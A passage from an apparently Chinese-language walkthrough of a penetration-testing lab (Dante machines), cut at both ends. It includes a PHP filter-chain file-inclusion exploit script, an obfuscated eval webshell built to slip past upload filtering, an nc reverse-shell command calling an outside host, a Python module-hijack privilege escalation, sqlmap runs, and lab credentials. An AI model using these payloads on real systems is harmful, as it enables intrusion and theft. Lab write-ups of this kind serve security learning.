class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"> </span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"> </span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>: final_payload</span><br><span class="line">&#125;,proxies=proxies)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>脚本执行结果如下所示：</p><p><img src="https://pic.imgdb.cn/item/6461e5ff0d2dde5777d6dd21.jpg"></p><p>接下来就反弹个shell，直接改脚本里的命令即可：</p><p><img src="https://pic.imgdb.cn/item/6461e6ba0d2dde5777d7e926.jpg"></p><p>之后我们读取&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress目录下的wp-config.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/editing-wp-config-php/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span> <span class="string">&#x27;wordpress&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;margaret&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;Welcome1!2@3#&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;put your unique phrase here&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the documentation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://wordpress.org/support/article/debugging-in-wordpress/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="title function_ invoke__">defined</span>( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="title function_ invoke__">define</span>( <span class="string">&#x27;ABSPATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span> ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>得到一组帐号密码：margaret:Welcome1!2@3#，还记得我们之前在&#x2F;etc&#x2F;passwd看到的那个账户吗？之后我们就通过ssh来连上去：</p><p><img src="https://pic.imgdb.cn/item/6461e7f70d2dde5777d9ae9a.jpg"></p><p>提示我们当前处于受限制的shell中，那接下来就是逃逸lshell了。通过google，我找到了一种逃逸方法，首先进入vim，之后执行下面两句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>之后我们就得到了&#x2F;bin&#x2F;bash这个shell了：</p><p><img src="https://pic.imgdb.cn/item/6461e8b30d2dde5777dab5e8.jpg"></p><p>之后cat flag.txt又拿到了一个flag。</p><h3 id="Snake-it-‘til-you-make-it"><a href="#Snake-it-‘til-you-make-it" class="headerlink" title="Snake it ‘til you make it"></a>Snake it ‘til you make it</h3><p>在margaret的用户目录下，存在一个.config目录，进入.config目录，发现使用了Slack，关于Slack的信息师傅们可以自行百度。可以找到缓存的文件~&#x2F;.config&#x2F;Slack&#x2F;exported_data&#x2F;secure&#x2F;2020-05-18.json，里面有一些Frank和Margaret的对话，通过对话可以推理得知，这台机器正是迁移之后的ubuntu镜像主机，而frank的密码TractorHeadtorchDeskmat在缓存文件里面也被Margaret说出，我们直接看这里：</p><p><img src="https://pic.imgdb.cn/item/6461ea9e0d2dde5777dce569.jpg"></p><p>之后我们登录上frank：</p><p><img src="https://pic.imgdb.cn/item/6461eac90d2dde5777dd10aa.jpg"></p><p>上传pspy并运行，可以看到有这么一个进程：</p><p><img src="https://pic.imgdb.cn/item/6461eb600d2dde5777ddad21.jpg"></p><p>在pspy中，我们发现这个进程每隔一段时间就会启动，并且是UID&#x3D;0（root）来启动这个进程。但是我们不能直接修改apache_restart.py，因为权限不够：</p><p><img src="https://pic.imgdb.cn/item/6461ecb90d2dde5777df4d44.jpg"></p><p>那就看一下apache_restart.py的内容吧：</p><p><img src="https://pic.imgdb.cn/item/6461edc30d2dde5777e0c31d.jpg"></p><p>接下来想要提权，首先我们需要了解python导包的搜索顺序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在当前目录下搜索该模块</span><br><span class="line">在环境变量 PYTHONPATH 中指定的路径列表中依次搜索</span><br><span class="line">在 Python 安装路径的 lib 库中搜索</span><br></pre></td></tr></table></figure><p>虽然我们不能直接修改apache_restart.py，但是我们可以在&#x2F;home&#x2F;frank的路径下面添加py包呢。因此提权思路就是，在&#x2F;home&#x2F;frank的目录下添加一个urllib.py，内容可以是反弹shell，也可以是别的，只要你能拿到root的shell即可，我这里是给&#x2F;bin&#x2F;bash设置suid位：</p><p><img src="https://pic.imgdb.cn/item/6461ee730d2dde5777e18bc0.jpg"></p><p>之后&#x2F;bin&#x2F;bash -p就拿到root权限了，可以看flag了：</p><p><img src="https://pic.imgdb.cn/item/6462b0890d2dde577711d4be.jpg"></p><p>至此DANTE-NIX02也打完了。</p><h3 id="Feeling-fintastic"><a href="#Feeling-fintastic" class="headerlink" title="Feeling fintastic"></a>Feeling fintastic</h3><p>接下来我们看172.16.1.17，fscan扫出来的开放的端口是80、139、445以及10000。10000端口是webmin服务，对，就是漏洞多的yp的那个。但是没帐号密码，拿不到shell。开放了445端口，尝试smbclient连一下看看能不能拿到什么信息？</p><p><img src="https://pic.imgdb.cn/item/6461efca0d2dde5777e69fb2.jpg"></p><p>有一个forensics目录共享，<code>proxychains4 smbclient \\\\172.16.1.17\\forensics</code>：</p><p><img src="https://pic.imgdb.cn/item/6461f2c30d2dde5777f076d7.jpg"></p><p>存在一个文件名叫monitor的文件，把它下载下来，发现是一个流量包，wireshark分析一下：</p><p><img src="https://pic.imgdb.cn/item/6461f0b90d2dde5777ea2799.jpg"></p><p>可以看到上面这块通过POST请求&#x2F;session_login.cgi之后就GET请求&#x2F;，猜测此处的POST请求登录成功了，那就看一下有没有密码：</p><p><img src="https://pic.imgdb.cn/item/6461f0ff0d2dde5777eaec4a.jpg"></p><p>得到一组帐号密码<code>admin:Password6543</code>，之后去登录10000端口处的webmin服务，发现可以成功登录。之后就是用msf的exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce模块来拿到meterpreter了：</p><p><img src="https://pic.imgdb.cn/item/6461f2a00d2dde5777f02438.jpg"></p><p>直接就是root权限，DANTE-NIX03也打完了。</p><h3 id="Let’s-take-this-discussion-elsewhere"><a href="#Let’s-take-this-discussion-elsewhere" class="headerlink" title="Let’s take this discussion elsewhere"></a>Let’s take this discussion elsewhere</h3><p>接下来我们看172.16.1.13，fscan的扫描结果显示开放的端口为80、443、445，进入80端口，是一个XAMPP的欢迎界面：</p><p><img src="https://pic.imgdb.cn/item/646209df0d2dde57772602b8.jpg"></p><p>smbclient也连不上，443端口也跟80端口界面一样，那接下来就爆破一下80端口的web目录吧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/rainb0w/tools/pspy-master]</span><br><span class="line">└─# dirsearch -u http://172.16.1.13/ -t 200 -x 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy=socks5://127.0.0.1:1080 </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                 </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                                                                                          </span><br><span class="line">                                                                                                                                                                                                                                 </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 220545</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/172.16.1.13/-_23-05-15_06-32-14.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-23-05-15_06-32-14.log</span><br><span class="line"></span><br><span class="line">Target: http://172.16.1.13/</span><br><span class="line"></span><br><span class="line">[06:32:15] Starting: </span><br><span class="line">[06:32:17] 301 -  332B  - /img  -&gt;  http://172.16.1.13/img/                </span><br><span class="line">[06:32:20] 301 -  336B  - /discuss  -&gt;  http://172.16.1.13/discuss/        </span><br><span class="line">[06:32:23] 403 -    1KB - /licenses                                        </span><br><span class="line">[06:32:28] 301 -  338B  - /dashboard  -&gt;  http://172.16.1.13/dashboard/    </span><br><span class="line">[06:32:32] 403 -    1KB - /%20                                             </span><br><span class="line">[06:32:32] 301 -  332B  - /IMG  -&gt;  http://172.16.1.13/IMG/                </span><br><span class="line">[06:32:49] 403 -    1KB - /*checkout*                                      </span><br><span class="line">[06:32:57] 301 -  332B  - /Img  -&gt;  http://172.16.1.13/Img/                </span><br><span class="line">[06:33:07] 403 -    1KB - /phpmyadmin                                      </span><br><span class="line">[06:33:25] 403 -    1KB - /webalizer                                       </span><br><span class="line">[06:33:32] 403 -    1KB - /*docroot*                                       </span><br><span class="line">[06:33:36] 403 -    1KB - /*                                               </span><br><span class="line">[06:33:45] 403 -    1KB - /con                                             </span><br><span class="line">[06:33:54] 301 -  338B  - /Dashboard  -&gt;  http://172.16.1.13/Dashboard/    </span><br><span class="line">[06:34:56] 403 -    1KB - /http%3A                                          </span><br><span class="line">[06:35:16] 403 -    1KB - /**http%3a                                        </span><br><span class="line">[06:35:34] 403 -    1KB - /*http%3A                                         </span><br><span class="line">[06:35:36] 301 -  334B  - /xampp  -&gt;  http://172.16.1.13/xampp/             </span><br><span class="line">[06:36:18] 403 -    1KB - /aux                                              </span><br><span class="line">[06:36:59] 403 -    1KB - /**http%3A                                        </span><br><span class="line">[06:37:47] 403 -    1KB - /%C0                                              </span><br><span class="line">[06:40:35] 403 -    1KB - /server-status                                    </span><br><span class="line">[06:41:24] 403 -    1KB - /%3FRID%3D2671</span><br></pre></td></tr></table></figure><p>利用dirsearch爆破除了个&#x2F;discuss目录，进入之后，界面是这样的：</p><p><img src="https://pic.imgdb.cn/item/64620ac20d2dde5777278c1c.jpg"></p><p>google一下之后，可以找到利用方法：<a href="https://www.exploit-db.com/exploits/48512">https://www.exploit-db.com/exploits/48512</a>。接下来我们开始注册，在注册上传头像那里直接上传webshell，只是这里似乎存在免杀？直接上传一句话webshell无法上传成功，因此尝试绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">&amp;<span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">foo</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个很简单的免杀就绕过了，之后会显示注册成功的界面：</p><p><img src="https://pic.imgdb.cn/item/64620c650d2dde57772ae1d1.jpg"></p><p>注册成功之后，进入&#x2F;discuss&#x2F;ups可以看到我们的webshell，蚁剑连接之后拿到shell（注意给蚁剑配置代理哦)。之后可以在<code>C:\Users\Gerald\Desktop</code>目录下看到flag。</p><h3 id="Compare-my-numbers"><a href="#Compare-my-numbers" class="headerlink" title="Compare my numbers"></a>Compare my numbers</h3><p>当前拿到的shell是gerald用户的，接下来开始提权。 进入<code>C:\Program Files (x86)</code>之后可以看到存在一个Druva的目录：</p><p>在Druva inSync的windows客户端6.6.3版本中，存在相对路径遍历允许未经身份验证的本地攻击者以 SYSTEM 权限执行任意操作系统命令的漏洞。因此searchsploit搜索这个漏洞：</p><p><img src="https://pic.imgdb.cn/item/64620ece0d2dde57772dd33a.jpg"></p><p>把48505.txt的后缀改为.py，将其和nc一起上传到靶机上，然后执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\python.exe 48505.py &quot;windows\system32\cmd.exe /C C:\xampp\htdocs\discuss\ups\nc64.exe 10.10.14.2 1237 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>成功反弹到shell，此时权限为system，DANTE-WS01也成功打完：</p><p><img src="https://pic.imgdb.cn/item/646211080d2dde577730487f.jpg"></p><h3 id="Again-and-again"><a href="#Again-and-again" class="headerlink" title="Again and again"></a>Again and again</h3><p>接下来我们看172.16.1.12，开放的端口有21、22、80、443以及3306。访问web界面，发现与172.16.1.13的界面一样，都是XAMPP的欢迎界面。尝试爆破目录，爆破出&#x2F;blog目录。使用了Responsive Blog：</p><p><img src="https://pic.imgdb.cn/item/646212280d2dde577731e0fe.jpg"></p><p>google一下找到了存在的漏洞，即<code>http://172.16.1.12/blog/category.php?id=1</code>此处存在sql注入，直接sqlmap一把梭：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://172.16.1.12/blog/category.php?id=1&quot; --proxy=socks5://127.0.0.1:1080 --dbs --batch</span><br><span class="line"></span><br><span class="line">available databases [7]:                                                                                                                                                                             </span><br><span class="line">[*] blog_admin_db</span><br><span class="line">[*] flag</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br><span class="line">[*] test</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag在flag数据库内。</p><h3 id="Five-doctors"><a href="#Five-doctors" class="headerlink" title="Five doctors"></a>Five doctors</h3><p>之后爆blog_admin_db库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Database: blog_admin_db                                                                                                                                                                              </span><br><span class="line">[13 tables]</span><br><span class="line">+-----------------------------+</span><br><span class="line">| banner_posts                |</span><br><span class="line">| blog_categories             |</span><br><span class="line">| blogs                       |</span><br><span class="line">| editors_choice              |</span><br><span class="line">| links                       |</span><br><span class="line">| membership_grouppermissions |</span><br><span class="line">| membership_groups           |</span><br><span class="line">| membership_userpermissions  |</span><br><span class="line">| membership_userrecords      |</span><br><span class="line">| membership_users            |</span><br><span class="line">| page_hits                   |</span><br><span class="line">| titles                      |</span><br><span class="line">| visitor_info                |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>membership_users表的部分字段爆破结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 